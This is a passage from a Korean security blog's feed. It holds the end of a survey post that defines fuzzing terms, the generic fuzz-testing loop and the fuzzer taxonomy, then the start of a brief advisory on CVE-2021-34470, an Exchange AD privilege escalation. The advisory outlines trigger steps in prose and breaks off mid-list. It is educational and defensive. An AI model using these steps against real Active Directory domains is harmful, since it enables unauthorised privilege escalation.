&#xC815;&#xC758;&#xD569;&#xC2DC;&#xB2E4;.</p><p>&#xD37C;&#xC9D5; &#xB3D9;&#xC791;&#xC774;&#xB780; &#x201C;fuzz input&#x201D;&#xC744; &#xC0AC;&#xC6A9;&#xD574; PUT(Program Under Test)&#xB97C; &#xC2E4;&#xD589;&#xD558;&#xB294; &#xAC83;&#xC774;&#xACE0;, &#x201C;fuzz input&#x201D;&#xC774;&#xB780; PUT&#xAC00; &#xC608;&#xC0C1;&#xD558;&#xC9C0; &#xBABB;&#xD560; input&#xC744; &#xB73B;&#xD569;&#xB2C8;&#xB2E4;. PUT&#xC774; &#xC798;&#xBABB; &#xCC98;&#xB9AC;&#xD558;&#xB294; input &#xD639;&#xC740; &#xAC1C;&#xBC1C; &#xC758;&#xB3C4;&#xC640;&#xB294; &#xB2E4;&#xB978; &#xD589;&#xB3D9;&#xC744; &#xBCF4;&#xC774;&#xB294; input&#xC744; &#xB123;&#xC5B4; PUT&#xC744; &#xC2E4;&#xD589;&#xD558;&#xB294; &#xAC83;&#xC774;&#xB77C;&#xACE0; &#xD574;&#xC11D;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xB97C; &#xD1B5;&#xD574; fuzzing&#xC744; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC774; &#xC815;&#xC758;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><blockquote><p>Definition 1 (Fuzzing) Fuzzing is the execution of the PUT using input(s) sampled from an input space (the &#x201C;fuzz input space&#x201D;) that protrudes the expected input space of the PUT.<br>fuzzing&#xC774;&#xB780; PUT&#xC758; &#xC608;&#xC0C1; &#xAC00;&#xB2A5; &#xC785;&#xB825; &#xACF5;&#xAC04;&#xC744; &#xCD08;&#xACFC;&#xD55C; &#xC785;&#xB825; &#xACF5;&#xAC04;(fuzz &#xC785;&#xB825; &#xACF5;&#xAC04;) &#xC911;&#xC5D0;&#xC11C; &#xC120;&#xBCC4;&#xB41C; &#xC785;&#xB825;&#xC744; PUT&#xC5D0; &#xB123;&#xC5B4; &#xC2E4;&#xD589;&#xD558;&#xB294; &#xAC83;</p></blockquote><p><img src="/2021/08/08/fabu1ous/fuzz-1/4.png" alt></p><ol><li>fuzz input space&#xAC00; expected input space&#xB97C; &#xD3EC;&#xD568; &#xAC00;&#xB2A5;</li><li>&#xBC18;&#xBCF5; &#xC2E4;&#xD589;&#xC740; fuzzing&#xC758; &#xD544;&#xC218;&#xC870;&#xAC74;&#xACFC; &#xAC19;&#xC73C;&#xB2C8; &#xAD73;&#xC774; &#xC815;&#xC758;&#xD560; &#xD544;&#xC694;&#xB294; &#xC5C6;&#xB2E4;.(= &#xBC18;&#xBCF5; &#xC2E4;&#xD589;&#xC774; &#xC544;&#xB2C8;&#xC5B4;&#xB3C4; &#xD37C;&#xC9D5;&#xC774;&#xB77C; &#xBD80;&#xB97C; &#xC218; &#xC788;&#xB2E4;)</li><li>sampling &#xC791;&#xC5C5;&#xC740; &#xAF2D; &#xB79C;&#xB364; &#xD558;&#xC9C0; &#xC54A;&#xB2E4;. (= &#xAF2D; &#xB79C;&#xB364; &#xC778;&#xD48B;&#xC744; &#xB123;&#xB294; &#xAC83;&#xC740; &#xC544;&#xB2C8;&#xB2E4;)</li></ol><p>Fuzz testing&#xC744; fuzzing &#xAE30;&#xC220;&#xC744; &#xC0AC;&#xC6A9;&#xD55C; &#xC18C;&#xD504;&#xD2B8;&#xC6E8;&#xC5B4; &#xAC80;&#xC0AC; &#xAE30;&#xC220;&#xC774;&#xB77C;&#xACE0; &#xC815;&#xC758;&#xD560; &#xC218; &#xC5C6;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC18C;&#xD504;&#xD2B8;&#xC6E8;&#xC5B4; &#xAC80;&#xC0AC; &#xAE30;&#xC220;&#xACFC; fuzzing&#xC758; &#xAC00;&#xC7A5; &#xD070; &#xCC28;&#xBCC4;&#xC810;&#xC740; &#xBC14;&#xB85C; &#xBAA9;&#xC801;&#xC131;&#xC785;&#xB2C8;&#xB2E4;. fuzzing&#xC758; &#xC8FC;&#xC694; &#xBAA9;&#xC801;&#xC740; crash&#xC640; &#xAC19;&#xC740; &#xBCF4;&#xC548; &#xAD00;&#xB828; &#xBC84;&#xADF8; &#xD0D0;&#xC0C9;&#xC774;&#xBBC0;&#xB85C; &#xBE44;&#xC2B7;&#xD55C; &#xB3D9;&#xC791;&#xC744; &#xD558;&#xC9C0;&#xB9CC; &#xBAA9;&#xC801;&#xC774; &#xB2E4;&#xB978; &#xAE30;&#xC220;&#xB4E4;&#xACFC; &#xAD6C;&#xBD84;&#xD558;&#xACE0; &#xAC15;&#xC870;&#xD558;&#xAE30; &#xC704;&#xD574; fuzz testing, fuzzer, fuzz campaign&#xC774;&#xB77C;&#xB294; &#xC6A9;&#xC5B4;&#xB97C; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC774; &#xC815;&#xC758;&#xD569;&#xB2C8;&#xB2E4;.</p><blockquote><p>Definition 2 (Fuzz Testing) Fuzz testing is the use of fuzzing to test if a PUT violates a security policy.<br>fuzz testing&#xC774;&#xB780; fuzzing &#xAE30;&#xC220;&#xC744; &#xC0AC;&#xC6A9;&#xD574; PUT&#xAC00; &#xBCF4;&#xC548; &#xC815;&#xCC45;&#xC5D0; &#xC5B4;&#xAE0B;&#xB098;&#xB294;&#xC9C0; &#xAC80;&#xC0AC;&#xD558;&#xB294; &#xAC83;</p><p>Definition 3 (Fuzzer) A fuzzer is a program that performs fuzz testing on a PUT. fuzzer&#xB780; PUT&#xC5D0; fuzz testing&#xC744; &#xC218;&#xD589;&#xD558;&#xB294; &#xD504;&#xB85C;&#xADF8;&#xB7A8;</p><p>Definition 4 (Fuzz Campaign) A fuzz campaign is a specific execution of a fuzzer on a PUT with a specific security policy.<br>fuzz campaign&#xC774;&#xB780; &#xD2B9;&#xC815; &#xBCF4;&#xC548; &#xC815;&#xCC45;&#xC744; &#xAC16;&#xB294; PUT&#xC5D0; &#xB300;&#xD55C; fuzzer&#xC758; &#xD2B9;&#xC815; &#xC2E4;&#xD589;</p></blockquote><p>&#xCD08;&#xCC3D;&#xAE30; &#xD37C;&#xC800;&#xB4E4;&#xC740; test case&#xAC00; PUT&#xC758; crash&#xB97C; &#xBC1C;&#xC0DD;&#xC2DC;&#xD0A4;&#xB294;&#xC9C0;&#xB9CC;&#xC744; &#xAC80;&#xC0AC;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD558;&#xC9C0;&#xB9CC; fuzz testing&#xC740; &#xC2E4;&#xD589;&#xB418;&#xB294; &#xB3D9;&#xC548; &#xAD00;&#xCE21;&#xD560; &#xC218; &#xC788;&#xB294; &#xBAA8;&#xB4E0; &#xBCF4;&#xC548; &#xC815;&#xCC45;&#xC744; &#xAC80;&#xC0AC;&#xD560; &#xC218; &#xC788;&#xACE0; &#xD2B9;&#xC815; &#xC2E4;&#xD589;&#xC774; &#xBCF4;&#xC548;&#xC815;&#xCC45;&#xC5D0; &#xC5B4;&#xAE0B;&#xB098;&#xB294;&#xC9C0; &#xD655;&#xC778;&#xD558;&#xB294; &#xBA54;&#xCEE4;&#xB2C8;&#xC998;&#xC744; Bug Oracle&#xC774;&#xB77C; &#xBD80;&#xB985;&#xB2C8;&#xB2E4;.</p><blockquote><p>Definition 5 (Bug Oracle) A bug oracle is a program, perhaps as part of a fuzzer, that determines whether a given execution of the PUT violates a specific security policy.<br>Bug Oracle&#xC774;&#xB780; &#xC81C;&#xACF5;&#xB41C; PUT&#xC758; &#xC2E4;&#xD589;&#xC774; &#xD2B9;&#xC815; &#xBCF4;&#xC548; &#xC815;&#xCC45;&#xC5D0; &#xC5B4;&#xAE0B;&#xB098;&#xB294;&#xC9C0; &#xAD6C;&#xBD84;&#xD558;&#xB294; &#xD504;&#xB85C;&#xADF8;&#xB7A8;</p></blockquote><p>fuzz algorithm&#xC740; fuzzer&#xC5D0; &#xAD6C;&#xD604;&#xB41C; &#xC54C;&#xACE0;&#xB9AC;&#xC998;&#xC73C;&#xB85C; PUT&#xC758; &#xBA87; &#xAC00;&#xC9C0; parameter&#xB4E4;&#xC5D0; &#xC758;&#xC874;&#xD558;&#xBA70; &#xADF8; parameter&#xB4E4;&#xC5D0; &#xB300;&#xD55C; &#xC124;&#xC815;&#xC744; fuzz configuration&#xC774;&#xB77C; &#xBD80;&#xB985;&#xB2C8;&#xB2E4;.</p><blockquote><p>Definition 6 (Fuzz Configuration) A fuzz configuration of a fuzz algorithm comprises the parameter value(s) that control(s) the fuzz algorithm.<br>Fuzz algorithm&#xC758; Fuzz configuration&#xC740; fuzz algorithm&#xC744; &#xC81C;&#xC5B4;&#xD558;&#xB294; parameter&#xAC12;&#xB4E4;&#xB85C; &#xC774;&#xB8E8;&#xC5B4;&#xC838; &#xC788;&#xB2E4;.</p></blockquote><p>&#xC989;, fuzz configuration&#xC740; fuzz algorithm &#xC885;&#xB958;&#xC5D0; &#xB530;&#xB77C; &#xB2EC;&#xB77C;&#xC9D1;&#xB2C8;&#xB2E4;. fuzz configuration&#xC744; fuzzing&#xC774; &#xC9C4;&#xD589;&#xB428;&#xC5D0; &#xB530;&#xB77C; &#xBC1C;&#xC804;&#xC2DC;&#xD0A4;&#xB294; fuzzer&#xAC00; &#xC788;&#xB294; &#xBC18;&#xBA74;, fuzz configuration&#xC744; &#xCC98;&#xC74C;&#xBD80;&#xD130; &#xB05D;&#xAE4C;&#xC9C0; &#xB3D9;&#xC77C;&#xD55C; &#xB0B4;&#xC6A9;&#xC73C;&#xB85C; &#xC720;&#xC9C0;&#xD558;&#xB294; fuzzer&#xB3C4; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>seed&#xB780; test case&#xB97C; &#xB9CC;&#xB4E4;&#xAE30; &#xC704;&#xD574; &#xC0AC;&#xC6A9;&#xB418;&#xB294; PUT&#xC758; input&#xC785;&#xB2C8;&#xB2E4;. fuzzer&#xB4E4;&#xC740; &#xB300;&#xAC1C; &#xC5EC;&#xB7EC; seed(seed pool)&#xB97C; &#xAC16;&#xACE0; &#xC788;&#xACE0; fuzz campaign&#xC774; &#xC9C4;&#xD589;&#xB418;&#xB294; &#xB3D9;&#xC548; &#xBCC0;&#xD654;&#xB97C; &#xC8FC;&#xB294; &#xC54C;&#xACE0;&#xB9AC;&#xC998;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xAE30;&#xB3C4; &#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xB610;&#xD55C; coverage-guided fuzzer&#xB4E4;&#xC740; coverage&#xB77C;&#xACE0; &#xD558;&#xB294; &#xC2E4;&#xD589; &#xC815;&#xBCF4;&#xB97C; &#xC800;&#xC7A5;&#xD574; &#xAC01; configuration&#xC758; &#xBC1C;&#xC804;&#xC744; &#xAE30;&#xB85D;&#xD569;&#xB2C8;&#xB2E4;.</p><h2 id="2-3-Fuzz-testing-algorithm"><a href="#2-3-Fuzz-testing-algorithm" class="headerlink" title="2.3 Fuzz testing algorithm"></a>2.3 Fuzz testing algorithm</h2><p><img src="/2021/08/08/fabu1ous/fuzz-1/5.png" alt></p><p>&#xC704; &#xC0AC;&#xC9C4;&#xC740; fuzz testing&#xC758; &#xBCF4;&#xD3B8;&#xC801;&#xC778; &#xC54C;&#xACE0;&#xB9AC;&#xC998;&#xC744; &#xC758;&#xC0AC; &#xCF54;&#xB4DC;&#xB85C; &#xC791;&#xC131;&#xD55C; &#xAC83;&#xC785;&#xB2C8;&#xB2E4;. Black-box, Grey-box, White-box&#xC758; &#xAE30;&#xCD08;&#xAC00; &#xB418;&#xB294; &#xCF54;&#xB4DC;&#xC774;&#xBA70; &#xB450;&#xAC1C;&#xC758; &#xAD6C;&#xC131;&#xC73C;&#xB85C; &#xB098;&#xB20C; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ol><li>Preprocess&#xB294; fuzz campaign&#xC758; &#xC2DC;&#xC791;&#xC73C;&#xB85C; &#x201C;&#xC804;&#xCC98;&#xB9AC;&#x201D; &#xB2E8;&#xACC4;&#xB77C; &#xBD80;&#xB985;&#xB2C8;&#xB2E4;.</li><li>5&#xAC1C;&#xC758; &#xD568;&#xC218;&#xB97C; &#xB8E8;&#xD504;&#xB85C; &#xC2E4;&#xD589;&#xD569;&#xB2C8;&#xB2E4;.<ul><li>Schedule, InputGen, InputEval, ConfUpdate, Continue</li><li>&#xD55C; &#xBC88;&#xC758; &#xB8E8;&#xD504; &#xC2E4;&#xD589;&#xC744; fuzz iteration&#xC774;&#xB77C; &#xBD80;&#xB984;</li><li>InputEval &#xB2E8;&#xACC4;&#xC5D0;&#xC11C; &#xC2E4;&#xC81C;&#xB85C; PUT&#xC774; &#xC2E4;&#xD589;&#xB418;&#xB294; &#xAC83;&#xC744; fuzz run&#xC774;&#xB77C; &#xBD80;&#xB984;</li></ul></li></ol><p>&#xC704;&#xC5D0;&#xC11C; &#xC5B8;&#xAE09;&#xD55C; &#xB300;&#xB85C; ConfUpdate &#xC791;&#xC5C5;&#xC744; &#xC218;&#xD589;&#xD558;&#xC9C0; &#xC54A;&#xB294; fuzzer&#xAC00; &#xC874;&#xC7AC;&#xD558;&#xB4EF; &#xD574;&#xB2F9; 5&#xB2E8;&#xACC4; &#xC911; &#xC77C;&#xBD80;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xC9C0; &#xC54A;&#xB294; fuzzer&#xB3C4; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ul><li><p>Preprocess(C) &#x2192; C</p><p>Preprocess &#xB2E8;&#xACC4;&#xB294; fuzz configuration&#xC744; input&#xC73C;&#xB85C; &#xBC1B;&#xC544; &#xC218;&#xC815;&#xD558;&#xACE0; &#xBC18;&#xD658;&#xD569;&#xB2C8;&#xB2E4;. fuzz algorithm&#xB9C8;&#xB2E4; &#xB2E4;&#xB978; &#xB3D9;&#xC791;&#xC744; &#xD558;&#xBA70; PUT&#xC5D0; Instrumentaion code&#xB97C; &#xC0BD;&#xC785;&#xD558;&#xAC70;&#xB098; seed file&#xC758; &#xC2E4;&#xD589; &#xC18D;&#xB3C4;&#xB97C; &#xCE21;&#xC815;&#xD558;&#xB294; &#xB4F1;&#xC758; &#xC791;&#xC5C5;&#xC744; &#xD569;&#xB2C8;&#xB2E4;.</p></li><li><p>Schedule(C, t_elapsed, t_limit) &#x2192; conf</p><p>&#xD604;&#xC7AC; set of fuzz configuration(C), current time(t_elapesed), timeout(t_limit)&#xC744; &#xC778;&#xD48B;&#xC73C;&#xB85C; &#xBC1B;&#xC544; &#xD604;&#xC7AC; iteration&#xC5D0; &#xC801;&#xC6A9;&#xC2DC;&#xD0AC; configuration(conf)&#xC744; &#xC120;&#xD0DD;&#xD569;&#xB2C8;&#xB2E4;.</p></li><li><p>InputGen(conf) &#x2192; tcs</p><p>fuzz configuration(conf)&#xC744; input&#xC73C;&#xB85C; &#xBC1B;&#xC544; teset cases(tcs)&#xB97C; &#xC0DD;&#xC131;&#xD569;&#xB2C8;&#xB2E4;. InputGen&#xC740; conf&#xC758; &#xD2B9;&#xC815;&#xD55C; parameter&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xBA70; conf&#xC18D; seed&#xB97C; &#xC0AC;&#xC6A9;&#xD574; input&#xC744; &#xC0DD;&#xC131;&#xD558;&#xAC70;&#xB098; model &#xD639;&#xC740; &#xBB38;&#xBC95;&#xC744; parameter&#xB85C; &#xC0AC;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;.</p></li><li><p>InputEval(conf, tsc, Obug) &#x2192; B&#x2019;, execinfo</p><p>fuzz configuration(conf)&#xACFC; teset cases(tcs), bug oracle(Obug)&#xC744; input&#xC73C;&#xB85C; &#xBC1B;&#xC544; tcs&#xAC00; PUT&#xC758; &#xBCF4;&#xC548; &#xC815;&#xCC45;&#xC5D0; &#xC5B4;&#xAE0B;&#xB098;&#xB294; &#xD589;&#xB3D9;&#xC744; &#xC720;&#xBC1C;&#xD558;&#xB294;&#xC9C0; &#xAC80;&#xC0AC;&#xD569;&#xB2C8;&#xB2E4;. set of bug(B&#x2019;)&#xC640; &#xAC01; fuzz run&#xC5D0; &#xB300;&#xD55C; &#xC815;&#xBCF4;(execinfo)&#xB97C; &#xBC18;&#xD658;&#xD558;&#xBA70; execinfo&#xB294; fuzz configuration update&#xC5D0; &#xC0AC;&#xC6A9;&#xB429;&#xB2C8;&#xB2E4;.</p></li><li><p>ConfUpdate(C, conf, execinfo) &#x2192; C</p><p>set of fuzz configuration(C), current configuration(conf), info of fuzz run(execinfo)&#xB97C; &#xC778;&#xD48B;&#xC73C;&#xB85C; &#xBC1B;&#xC74C; set of fuzz configuration(C)&#xC744; &#xC218;&#xC815;&#xD569;&#xB2C8;&#xB2E4;. &#xB9CE;&#xC740; gray-box fuzzer&#xB4E4;&#xC740; execinfo&#xB97C; &#xD1B5;&#xD574; set of fuzz configuration(C)&#xC758; &#xAC1C;&#xC218;&#xB97C; &#xC904;&#xC774;&#xB294; &#xC791;&#xC5C5;&#xC744; &#xD569;&#xB2C8;&#xB2E4;.</p></li><li><p>Continue(C) &#x2192; {True, False}</p><p>set of fuzz configuration(C) C&#xB97C; &#xBC1B;&#xC544; &#xB2E4;&#xC74C; iteration&#xC758; &#xC2E4;&#xD589; &#xC5EC;&#xBD80;&#xB97C; &#xACB0;&#xC815;&#xD569;&#xB2C8;&#xB2E4;. white-box fuzzer&#xC5D0;&#xC120; &#xB354; &#xC774;&#xC0C1; &#xBC1C;&#xACAC;&#xD560; path&#xAC00; &#xC5C6;&#xC73C;&#xBA74; &#xC885;&#xB8CC;&#xD558;&#xB294; &#xB4F1;&#xC758; &#xC791;&#xC5C5;&#xC744; &#xD569;&#xB2C8;&#xB2E4;.</p></li></ul><h2 id="2-4-Texonomy-of-fuzzer"><a href="#2-4-Texonomy-of-fuzzer" class="headerlink" title="2.4 Texonomy of fuzzer"></a>2.4 Texonomy of fuzzer</h2><p>fuzzer &#xB9C8;&#xB2E4; &#xAC01; fuzz run&#xC5D0;&#xC11C; &#xC218;&#xC9D1;&#xD558;&#xB294; data&#xC758; &#xC885;&#xB958;&#xAC00; &#xB2E4;&#xB974;&#xBA70; &#xC774;&#xB97C; &#xD1B5;&#xD574; fuzzer&#xB97C; 3&#xAC00;&#xC9C0;&#xB85C; &#xAD6C;&#xBD84;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/08/08/fabu1ous/fuzz-1/6.png" alt></p><h3 id="2-4-1-Black-box-fuzzer"><a href="#2-4-1-Black-box-fuzzer" class="headerlink" title="2.4.1 Black-box fuzzer"></a>2.4.1 Black-box fuzzer</h3><p>PUT&#xC758; &#xB0B4;&#xBD80;&#xC5D0; &#xB300;&#xD55C; &#xC815;&#xBCF4; &#xC5C6;&#xC774; &#xD589;&#xD574;&#xC9C0;&#xB294; software-testing&#xACFC; fuzzing&#xC744; black-box&#xB77C; &#xBD80;&#xB985;&#xB2C8;&#xB2E4;. PUT&#xC758; input/output &#xB3D9;&#xC791;&#xB9CC;&#xC744; &#xAD00;&#xCE21;&#xD558;&#xACE0; &#xC0AC;&#xC6A9;&#xD558;&#xBBC0;&#xB85C; software-testing&#xC5D0;&#xC120; IO-driven &#xD639;&#xC740; data-driven testing&#xC774;&#xB77C;&#xACE0;&#xB3C4; &#xBD80;&#xB985;&#xB2C8;&#xB2E4;. &#xACE0;&#xC804;&#xC801;&#xC778; fuzzer&#xB4E4;&#xC740; &#xB300;&#xBD80;&#xBD84; black-box fuzzer&#xC5D0; &#xC18D;&#xD569;&#xB2C8;&#xB2E4;.</p><h3 id="2-4-2-White-box-fuzzer"><a href="#2-4-2-White-box-fuzzer" class="headerlink" title="2.4.2 White-box fuzzer"></a>2.4.2 White-box fuzzer</h3><p>PUT&#xC758; internals&#xB97C; &#xBD84;&#xC11D;&#xD55C; &#xC815;&#xBCF4;&#xC640; PUT&#xC744; &#xC2E4;&#xD589;&#xD574; &#xC218;&#xC9D1;&#xD55C; &#xC815;&#xBCF4;&#xB97C; &#xD1B5;&#xD574; test case&#xB97C; &#xC0DD;&#xC131;&#xD558;&#xB294; fuzzer&#xC785;&#xB2C8;&#xB2E4;. White-box fuzzing&#xC740; 2007&#xB144; Godefroid&#xC5D0; &#xC758;&#xD574; &#xC18C;&#xAC1C;&#xB418;&#xC5C8;&#xACE0; DSE(Dynamic Symbolic execution)&#xC758; dynamic instrumentaion&#xACFC; SMT solving&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; overhead&#xAC00; black-box&#xBCF4;&#xB2E4; &#xB192;&#xC740; &#xAC8C; &#xC77C;&#xBC18;&#xC801;&#xC785;&#xB2C8;&#xB2E4;.</p><h3 id="2-4-3-Grey-box-fuzzer"><a href="#2-4-3-Grey-box-fuzzer" class="headerlink" title="2.4.3 Grey-box fuzzer"></a>2.4.3 Grey-box fuzzer</h3><p>black-box&#xC640; white-box&#xC758; &#xC911;&#xB2E8; &#xB2E8;&#xACC4;&#xB97C; &#xD0DD;&#xD55C; fuzzer&#xC785;&#xB2C8;&#xB2E4;. &#xAC04;&#xB2E8;&#xD55C; &#xC815;&#xC801; &#xBD84;&#xC11D;&#xACFC; &#xC2E4;&#xD589;&#xC5D0; &#xB300;&#xD55C; &#xB3D9;&#xC801; &#xC815;&#xBCF4;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xB4F1; PUT&#xC758; internals&#xC640; &#xC2E4;&#xD589;&#xC5D0; &#xB300;&#xD55C; &#xC77C;&#xBD80; &#xC815;&#xBCF4;&#xB97C; &#xC218;&#xC9D1;&#xD558;&#xBA70; white-box&#xC640; &#xB2EC;&#xB9AC; PUT&#xC5D0; &#xB300;&#xD55C; &#xC644;&#xBCBD;&#xD55C; &#xBD84;&#xC11D; &#xC815;&#xBCF4;&#xAC00; &#xD544;&#xC694; &#xC5C6;&#xC2B5;&#xB2C8;&#xB2E4;. grey-box&#xC758; &#xAC00;&#xC7A5; &#xD754;&#xD55C; &#xC608;&#xB85C; code coverage &#xAE30;&#xBC18; &#xC18D;&#xB3C4; &#xAC1C;&#xC120;&#xC774; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>black-box, grey-box, white-box fuzzer&#xC5D0; &#xB300;&#xD55C; &#xC774;&#xB7F0; &#xAD6C;&#xBD84;&#xC740; &#xBA85;&#xD655;&#xD558;&#xC9C0; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;. PUT&#xC5D0; &#xB300;&#xD55C; &#xC815;&#xBCF4;&#xC218;&#xC9D1;&#xC744; &#xD558;&#xB294; black-box&#xB3C4; &#xC874;&#xC7AC;&#xD558;&#xBA70; &#xADFC;&#xC0AC;&#xAC12;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xB294; white-box &#xB610;&#xD55C; &#xC874;&#xC7AC;&#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xC5EC;&#xC804;&#xD788; &#xADF8; &#xACBD;&#xACC4;&#xAC00; &#xBAA8;&#xD638;&#xD569;&#xB2C8;&#xB2E4;.</p><h1 id="&#xB2E4;&#xC74C;-&#xD30C;&#xD2B8;-&#xC608;&#xACE0;"><a href="#&#xB2E4;&#xC74C;-&#xD30C;&#xD2B8;-&#xC608;&#xACE0;" class="headerlink" title="&#xB2E4;&#xC74C; &#xD30C;&#xD2B8; &#xC608;&#xACE0;"></a>&#xB2E4;&#xC74C; &#xD30C;&#xD2B8; &#xC608;&#xACE0;</h1><p><img src="/2021/08/08/fabu1ous/fuzz-1/7.png" alt></p><p>&#xC774;&#xBC88; &#xD30C;&#xD2B8;&#xB294; &#xCD08;&#xBC18;&#xBD80;&#xB77C; &#xC26C;&#xC6B4; &#xD3B8;&#xC5D0; &#xC18D;&#xD569;&#xB2C8;&#xB2E4;. &#xB2E4;&#xC74C; &#xD30C;&#xD2B8;&#xBD80;&#xD130;&#xB294; intsrumentaion, bug oracle, seed selection &#xB4F1; &#xC774;&#xB984;&#xB9CC; &#xB4E4;&#xC5B4;&#xB3C4; &#xBA38;&#xB9AC;&#xAC00; &#xC544;&#xD30C;&#xC624;&#xB294;, &#xAC01;&#xAC01; &#xC5F0;&#xAD6C;&#xAE00; &#xD558;&#xB098;&#xB294; &#xCDA9;&#xBD84;&#xD788; &#xC4F0;&#xACE0;&#xB3C4; &#xB0A8;&#xC744; &#xC8FC;&#xC81C;&#xB4E4;&#xC744; &#xB2E4;&#xB8F0; &#xC608;&#xC815;&#xC785;&#xB2C8;&#xB2E4;. &#xC774;&#xBC88; &#xAE00;&#xC740; &#xB2E8;&#xC21C;&#xD788; &#xC815;&#xB9AC;&#xD558;&#xBA74; &#xB05D;&#xC774;&#xC5C8;&#xC9C0;&#xB9CC; &#xB2E4;&#xC74C; &#xAE00;&#xBD80;&#xD134; &#xCD94;&#xAC00;&#xB85C; &#xACF5;&#xBD80;&#xD574;&#xC57C; &#xD560;&#xAC8C; &#xC0B0;&#xB354;&#xBBF8;&#xB77C;&#x2026; &#xD37C;&#xC800;101 &#xC2DC;&#xB9AC;&#xC988;&#xB294; &#xC815;&#xB9D0; &#xC624;&#xB798;&#xC624;&#xB798; &#xD2C8;&#xD2C8;&#xC774; &#xC791;&#xC131;&#xD560; &#xAC70; &#xAC19;&#xAD70;&#xC694;.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Research/">Research</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/fuzzing/">fuzzing</category>
      
      <category domain="https://hackyboiz.github.io/tags/Fabu1ous/">Fabu1ous</category>
      
      <category domain="https://hackyboiz.github.io/tags/fuzzer/">fuzzer</category>
      
      <category domain="https://hackyboiz.github.io/tags/servey/">servey</category>
      
      
      <comments>https://hackyboiz.github.io/2021/08/08/fabu1ous/fuzz-1/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2021-34470: Exchange AD Schema Misconfiguration Elevation of Privilege</title>
      <link>https://hackyboiz.github.io/2021/08/06/j0ker/2021-08-06/</link>
      <guid>https://hackyboiz.github.io/2021/08/06/j0ker/2021-08-06/</guid>
      <pubDate>Fri, 06 Aug 2021 05:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://bugs.chromium.org/p/project-zero/issues/det</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><ul><li><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=2186&amp;q=finder%3Dforshaw&amp;can=1&amp;sort=-reported">https://bugs.chromium.org/p/project-zero/issues/detail?id=2186&amp;q=finder%3Dforshaw&amp;can=1&amp;sort=-reported</a></li></ul><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Exchange</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>MS Exchange&#xC5D0;&#xC11C; &#xB0AE;&#xC740; &#xAD8C;&#xD55C;&#xC5D0;&#xC11C; &#xAC70;&#xC758; &#xBAA8;&#xB4E0; AD &#xC624;&#xBE0C;&#xC81D;&#xD2B8;&#xB97C; &#xC0DD;&#xC131;&#xD560; &#xC218; &#xC788;&#xB294; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.  &#xAE30;&#xC874;&#xC5D0;&#xB294; &#xBAA8;&#xB4E0; &#xACC4;&#xC815;&#xC5D0;&#xC11C; &#xD558;&#xC704; &#xC624;&#xBE0C;&#xC81D;&#xD2B8;&#xB9CC; &#xC0DD;&#xC131;&#xD560; &#xC218; &#xC788;&#xC9C0;&#xB9CC; msExchStorageGroup&#xC744; &#xC0DD;&#xC131;&#xD558;&#xAE30;&#xB9CC; &#xD558;&#xBA74; &#xC2A4;&#xD0A4;&#xB9C8; &#xC124;&#xC815; &#xC624;&#xB958;&#xB85C; &#xC778;&#xD574; &#xBAA8;&#xB4E0; &#xC624;&#xBE0C;&#xC81D;&#xD2B8;&#xB97C; &#xC0DD;&#xC131;&#xD560; &#xC218; &#xC788;&#xB3C4;&#xB85D; &#xAD8C;&#xD55C;&#xC744; &#xD68D;&#xB4DD;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xCDE8;&#xC57D;&#xC810; &#xD2B8;&#xB9AC;&#xAC70; &#xACFC;&#xC815;&#xC740; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ol><li>&#xC6CC;&#xD06C;&#xC2A4;&#xD14C;&#xC774;&#xC158;&#xC5D0;&#xC11C; SYSTEM &#xAD8C;&#xD55C;&#xC73C;&#xB85C;(2019 &#xC774;&#xD558; &#xBC84;&#xC804;&#xC5D0;&#xC11C;&#xB294; &#xC77C;&#xBC18; &#xAD8C;&#xD55C;&#xC5D0;&#xC11C;&#xB3C4; &#xAC00;&#xB2A5;) &#xCF54;&#xB4DC;&#xB97C; &#xC2E4;&#xD589;&#xD569;&#xB2C8;&#xB2E4;.</li><li>AD&#xC5D0;&#xC11C; &#xCEF4;&#xD4E8;&#xD130; &#xC624;&#xBE0C;&#xC81D;&#xD2B8; &#xC544;&#xB798; msExchStorageGroup&#xC744; 